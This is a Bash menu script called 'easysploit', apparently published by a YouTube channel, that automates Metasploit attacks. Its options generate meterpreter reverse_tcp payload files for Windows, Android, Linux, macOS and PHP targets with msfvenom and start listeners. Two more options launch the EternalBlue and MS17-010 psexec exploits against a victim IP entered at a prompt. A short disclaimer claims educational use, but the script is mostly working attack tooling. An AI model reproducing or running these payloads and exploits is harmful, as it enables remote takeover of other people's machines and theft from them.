# easysploit
clear
echo -e '\e[1;33m
 mmmmmm   mm    mmmm m     m  mmmm  mmmmm  m       mmmm  mmmmm mmmmmmm
 #        ##   #"   " "m m"  #"   " #   "# #      m"  "m   #      #    
 #mmmmm  #  #  "#mmm   "#"   "#mmm  #mmm#" #      #    #   #      #   
 #       #mm#      "#   #        "# #      #      #    #   #      #   
 #mmmmm #    # "mmm#"   #    "mmm#" #      #mmmmm  #mm#  mm#mm    #  v2.1 
                                                                  (Linux) \e[1;34m
                                Created by "KALI LINUX TRICKS"
                                https://www.youtube.com/c/KALILINUXTRICKS\e[0m \e[1;31m

 Usage of EASYSPLOIT for attacking targets without prior mutual consent is
 ILLEGAL. Developers are not responsible for any damage caused by this script.
 EASYSPLOIT is intented ONLY FOR EDUCATIONAL PURPOSES!!! STAY LEGAL!!!
\e[1;32m
(1) Windows --> test.exe  
(2) Android --> test.apk             
(3) Linux --> test.py
(4) MacOS --> test.jar
(5) Web --> test.php
(6) Exploit Windows 7/2008 x64 (ms17_010_eternalblue)
(7) Exploit Windows Vista/XP/2000/2003 (ms17_010_psexec)  
(8) Contact with me - My accounts
'

service postgresql start
exe='1'
apk='2'
py='3'
jar='4'
php='5'
eternalblue='6'
psexec='7'
me='8'

read x

if [ "$x" == "$exe" ]; then                    #EXE
echo 'Your IP:'
read l
msfvenom -p windows/meterpreter/reverse_tcp lhost=$l lport=4444 -f exe > /root/Desktop/test.exe
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"


elif [ "$x" == "$apk" ]; then                          #APK
echo 'Your IP:'
read l
msfvenom -p android/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.apk
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"




elif [ "$x" == "$py" ]; then                       #PYTHON
echo 'Your IP:'
read l
msfvenom -p python/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.py
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"



elif [ "$x" == "$jar" ]; then                        #JAVA
echo 'Your IP:' 
read l
msfvenom -p java/meterpreter/reverse_tcp lhost=$l lport=4444 -f jar > /root/Desktop/test.jar
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"






elif [ "$x" == "$php" ]; then                        #PHP
echo 'Your IP:' 
read l
msfvenom -p php/meterpreter/reverse_tcp lhost=$l lport=4444 > /root/Desktop/test.php
echo -e '

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/test.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $l ; set lport 4444 ; exploit ;"











elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
echo 'Your IP:'
read l
echo "Victims IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $l ; set rhost $r ; exploit ;"





elif [ "$x" == "$psexec" ]; then                        #PSEXEC
echo 'Your IP:'
read l
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $l ; set rhost $r ; exploit ;"


elif [ "$x" == "$me" ]; then                 #CONTACT WITH ME                      



echo -e '\e[1;33m
 mmmmmm   mm    mmmm m     m  mmmm  mmmmm  m       mmmm  mmmmm mmmmmmm
 #        ##   #"   " "m m"  #"   " #   "# #      m"  "m   #      #   
 #mmmmm  #  #  "#mmm   "#"   "#mmm  #mmm#" #      #    #   #      #   
 #       #mm#      "#   #        "# #      #      #    #   #      #   
 #mmmmm #    # "mmm#"   #    "mmm#" #      #mmmmm  #mm#  mm#mm    #  v1.1 \e[0m

 \e[1;31m
 https://www.youtube.com/c/KALILINUXTRICKS 
 \e[1;32m
 https://github.com/KALILINUXTRICKSYT
 \e[1;34m
 https://www.twitter.com/KALILINUXTRICKS
 \e[1;35m
 https://www.instagram.com/kali_linux_tricks_youtube
 \e[1;33m
 https://www.patreon.com/kalilinuxtricks
 \e[1;37m
 kalilinuxtricks@gmail.com


 
'

else 



 
echo -e ' \e[1;31m
 _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _ 
| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
|_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_|
(_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_)                                                                           

 ####### #     # ######  #######    #     # ####### ######  ####### 
    #     #   #  #     # #          ##   ## #     # #     # #       
    #      # #   #     # #          # # # # #     # #     # #       
    #       #    ######  #####      #  #  # #     # ######  #####   
    #       #    #       #          #     # #     # #   #   #       
    #       #    #       #          #     # #     # #    #  #       
    #       #    #       #######    #     # ####### #     # ####### 
                                                                   
  #####     #    ######  ####### ####### #     # #       #       #     # 
 #     #   # #   #     # #       #       #     # #       #        #   #  
 #        #   #  #     # #       #       #     # #       #         # #   
 #       #     # ######  #####   #####   #     # #       #          #    
 #       ####### #   #   #       #       #     # #       #          #    
 #     # #     # #    #  #       #       #     # #       #          #    
  #####  #     # #     # ####### #        #####  ####### #######    #    
 _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _ 
| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
|_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_| |_|
(_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_) (_)                                                                           
'


fi





